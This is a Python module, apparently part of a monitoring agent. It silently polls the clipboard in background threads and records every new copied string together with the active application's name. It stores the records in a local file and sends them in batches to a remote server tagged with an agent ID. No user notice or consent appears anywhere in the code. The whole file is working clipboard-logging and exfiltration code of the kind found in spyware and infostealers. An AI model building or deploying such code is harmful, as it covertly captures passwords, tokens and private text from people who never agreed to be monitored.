import os
import json
import time
import threading
import datetime
import logging
from typing import Optional

from config.settings import (
    CLIPBOARD_FILE,
    CLIPBOARD_FLUSH_INTERVAL,
    CLIPBOARD_BATCH_SIZE,
    CLIPBOARD_SEND_INTERVAL,
    CLIPBOARD_MIN_LENGTH,
    CLIPBOARD_MAX_LENGTH
)
from core.current_app import get_current_app
from api.client import send_clipboards

try:
    import pyperclip
except ImportError:
    pyperclip = None

logger = logging.getLogger("clipboard")
logging.basicConfig(level=logging.INFO)

# =========================
# STATE
# =========================
LOG_BUFFER = []
SEND_BUFFER = []
LOCK = threading.Lock()
AGENT_ID = None
LAST_CLIPBOARD = None
RUNNING = False

# =========================
# FILE SETUP
# =========================
def _ensure_file():
    """Ensure the clipboard file and its directory exist."""
    os.makedirs(os.path.dirname(CLIPBOARD_FILE), exist_ok=True)


# =========================
# HELPERS
# =========================
def _now():
    """Get current UTC timestamp in ISO format."""
    return datetime.datetime.utcnow().isoformat() + "Z"


def _write_event(value):
    """Write a clipboard event to the log buffer."""
    with LOCK:
        LOG_BUFFER.append({
            "ts": _now(),
            "app": get_current_app(),
            "value": value
        })


def _is_valid_content(content):
    """Check if clipboard content meets length requirements."""
    if not isinstance(content, str):
        return False
    content_len = len(content)
    return CLIPBOARD_MIN_LENGTH < content_len < CLIPBOARD_MAX_LENGTH


# =========================
# CLIPBOARD MONITORING
# =========================
def _check_clipboard():
    """Check clipboard for new content and log if it changed."""
    global LAST_CLIPBOARD

    try:
        current_clipboard = pyperclip.paste()

        # Only log if content changed and meets requirements
        if current_clipboard != LAST_CLIPBOARD and _is_valid_content(current_clipboard):
            _write_event(current_clipboard)
            LAST_CLIPBOARD = current_clipboard

    except Exception as e:
        logger.error(f"Clipboard check error: {e}")


# =========================
# DISK FLUSH
# =========================
def _flush_to_disk():
    """Flush the log buffer to disk."""
    global LOG_BUFFER, SEND_BUFFER

    if not LOG_BUFFER:
        return

    with LOCK:
        logs = LOG_BUFFER.copy()
        LOG_BUFFER.clear()

    # add to send buffer
    SEND_BUFFER.extend(logs)

    # save to disk
    with open(CLIPBOARD_FILE, "a", encoding="utf-8") as f:
        for event in logs:
            f.write(json.dumps(event) + "\n")


# =========================
# CLIPBOARD CHECK LOOP
# =========================
def _monitor_clipboard_loop():
    """Background thread to check clipboard at intervals."""
    while RUNNING:
        time.sleep(CLIPBOARD_FLUSH_INTERVAL)

        try:
            _check_clipboard()
            _flush_to_disk()
        except Exception as e:
            logger.error(f"Clipboard monitor error: {e}")


# =========================
# SERVER COMMUNICATION
# =========================
def _flush_to_server():
    """Send a batch of clipboard events to the server."""
    global SEND_BUFFER

    if not AGENT_ID:
        return

    with LOCK:
        if not SEND_BUFFER:
            return

        logs_to_send = SEND_BUFFER[:CLIPBOARD_BATCH_SIZE]

    try:
        send_clipboards(AGENT_ID, logs_to_send)

        with LOCK:
            SEND_BUFFER = SEND_BUFFER[len(logs_to_send):]

        logger.info(f"Sent {len(logs_to_send)} clipboard events to server")

    except Exception as e:
        logger.error(f"Send failed: {e}")


# =========================
# SEND TO SERVER LOOP
# =========================
def _send_to_server_loop():
    """Background thread to send clipboard events to server at intervals."""
    while RUNNING:
        time.sleep(CLIPBOARD_SEND_INTERVAL)

        try:
            _flush_to_server()
        except Exception as e:
            logger.error(f"Send loop error: {e}")


# =========================
# PUBLIC API
# =========================
def start_clipboard(agent_id: str | None) -> Optional[bool]:
    """Start the clipboard monitor service."""
    global AGENT_ID, RUNNING

    if pyperclip is None:
        logger.warning("pyperclip not installed, clipboard monitor disabled")
        return None

    if RUNNING:
        logger.info("Clipboard monitor already running.")
        return True

    AGENT_ID = agent_id
    RUNNING = True

    _ensure_file()

    # clipboard monitor thread
    monitor_thread = threading.Thread(target=_monitor_clipboard_loop, daemon=True)
    monitor_thread.start()

    # server send thread
    send_thread = threading.Thread(target=_send_to_server_loop, daemon=True)
    send_thread.start()

    logger.info(f"Clipboard monitor started -> {CLIPBOARD_FILE}")

    return True


def stop_clipboard() -> None:
    """Stop clipboard monitor and sender threads."""
    global RUNNING
    RUNNING = False
    logger.info("Clipboard monitor stopped.")
